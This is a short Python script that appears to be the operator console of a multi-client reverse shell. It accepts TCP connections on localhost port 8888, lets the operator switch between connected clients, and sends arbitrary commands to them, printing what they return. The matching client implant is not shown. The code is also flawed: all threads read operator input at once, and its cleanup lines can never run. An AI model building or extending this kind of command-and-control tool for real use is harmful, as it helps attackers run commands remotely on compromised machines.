import socket
import os
import threading


def handle_client(client_socket, client_address, client_sockets):
    print(f'[+] Client connected: {client_address}')

    while True:
        message = input('>> ')

        if message.startswith('switch'):
            try:
                client_index = int(message.split()[1]) - 1
                client_address = list(client_sockets.keys())[client_index]
                client_socket = client_sockets[client_address]
                print(f'[+] Switched to client {client_address}')
            except (IndexError, ValueError):
                print('[-] Invalid client index')
            continue

        if message.startswith('cmd'):
            command = message.split(maxsplit=1)[1]
            client_socket.send(command.encode())
            output = client_socket.recv(1024).decode()
            print(output)
            continue

        print('[-] Invalid command')

    client_socket.close()
    print(f'[+] Client disconnected: {client_address}')


def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('localhost', 8888))
    server_socket.listen(5)

    print('[+] Server started')

    client_sockets = {}

    while True:
        client_socket, client_address = server_socket.accept()
        client_sockets[client_address] = client_socket
        threading.Thread(target=handle_client, args=(
            client_socket, client_address, client_sockets)).start()


if __name__ == '__main__':
    start_server()
